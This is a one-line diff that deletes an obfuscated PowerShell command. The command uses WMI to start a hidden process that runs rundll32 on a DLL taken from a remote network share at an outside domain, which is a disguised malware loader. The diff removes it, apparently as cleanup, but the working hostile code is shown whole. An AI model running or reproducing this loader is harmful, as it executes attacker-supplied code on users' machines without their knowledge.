@@ -1,1 +1,0 @@
-$apCCVc=([wmiclass](-join('Win3','2_Proce','ssSta','rtup'))).CreateInstance();$apCCVc.ShowWindow=0;([wmiclass]('Win3'+'2_Proc'+'e'+'ss')).Create(('cmd /c'+' push'+'d '+'\\cvt.'+'digis'+'hart.n'+'ew'+'s\22'+'e377df-b'+'e40'+'-4f8c-b5'+'2a-66a85'+'c0c2f0'+'e & ru'+'ndl'+'l32'+' pf.'+'ch,'+'#1'),$null,$apCCVc)
